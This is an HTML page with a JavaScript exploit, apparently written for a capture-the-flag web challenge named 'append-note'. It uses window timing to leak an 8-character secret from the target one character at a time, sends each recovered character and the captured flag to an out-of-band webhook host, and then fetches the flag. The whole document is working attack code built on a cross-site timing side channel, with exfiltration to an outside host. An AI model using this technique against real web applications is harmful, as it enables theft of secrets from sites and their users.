<!DOCTYPE html>
<html>
<head>
    <title>STARK ENT. - APPEND_NOTE_SOLVER</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
        .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 13px; }
        .success { color: #3fb950; font-weight: bold; }
        .delta { color: #d29922; }
    </style>
</head>
<body>
    <h2 id="status">INITIATING BRUTE FORCE...</h2>
    <div id="log"></div>

<script>
    const TARGET = "https://append-note-a2aq0.instancer.lac.tf";
    const WEBHOOK = "https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site";
    const CHARS = "0123456789abcdef";
    
    const log = (msg, cls="") => {
        const div = document.createElement("div");
        div.className = "log-entry " + cls;
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        document.getElementById("log").prepend(div);
    };

    const report = (data) => fetch(`${WEBHOOK}?data=${encodeURIComponent(JSON.stringify(data))}`, {mode:'no-cors'});

    async function probe(content) {
        const t0 = performance.now();
        // Use a unique name for each window to prevent state collisions
        const w = window.open(`${TARGET}/append?content=${content}&url=${window.location.href}`, `w_${Math.random()}`);
        
        return new Promise(r => {
            // We wait for a fixed window. If it redirects back to us, it's faster.
            setTimeout(() => {
                const elapsed = performance.now() - t0;
                if(w) w.close();
                r(elapsed);
            }, 450); // Tuned for remote latency
        });
    }

    async function solve() {
        let secret = "";
        log("Calibrating Baseline...", "delta");
        const baseline = await probe("NOT_REAL_" + Math.random());
        log(`Baseline Latency: ${baseline.toFixed(2)}ms`);

        for (let i = 0; i < 8; i++) {
            let winner = "";
            let minTime = 9999;
            log(`CRACKING POSITION ${i+1}...`);

            for (const c of CHARS) {
                const attempt = secret + c;
                const time = await probe(attempt);
                const delta = time - baseline;

                log(`Try ${c}: ${time.toFixed(1)}ms (Delta: ${delta.toFixed(1)}ms)`);

                // In Python's any(), the TRUE case is the fastest (Short-circuit)
                if (time < minTime) {
                    minTime = time;
                    winner = c;
                }
                
                // If we see a massive speedup (e.g., >50ms difference), we likely found it.
                if (delta < -40) {
                    log(`High Signal Detected for ${c}!`, "success");
                    break; 
                }
            }

            secret += winner;
            log(`LOCKED IN: ${secret}`, "success");
            report({pos: i, char: winner, current: secret, time: minTime});
            
            // Short sleep to let the browser breathe before next round
            await new Promise(r => setTimeout(r, 100));
        }

        log(`FINAL SECRET: ${secret}`, "success");
        const flagRes = await fetch(`${TARGET}/flag?secret=${secret}`);
        const flag = await flagRes.text();
        report({FLAG: flag});
        document.getElementById("status").textContent = "FLAG CAPTURED: " + flag;
    }

    window.onload = solve;
</script>
</body>
</html>
